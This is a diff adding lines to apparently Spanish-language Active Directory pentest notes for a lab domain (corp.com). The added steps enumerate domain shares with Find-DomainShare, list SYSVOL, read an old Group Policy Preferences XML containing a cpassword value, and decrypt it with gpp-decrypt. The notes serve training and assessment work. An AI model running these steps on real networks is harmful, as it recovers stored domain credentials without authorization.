@@ -598,8 +598,23 @@ dnscat2
 
      "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
   
+ Ver compartidos:
 
+    Find-DomainShare
 
+ Listar uno de ellos:
+
+     ls \\dc1.corp.com\sysvol\corp.com\
+
+ ### Ficheros interesantes AD:
+
+     cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+
+        cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+
+ Desencriptamos con 'gpp-decrypt' en nuestro Kali:
+
+     gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 
 ## Vulnerabilidades conocidas
 
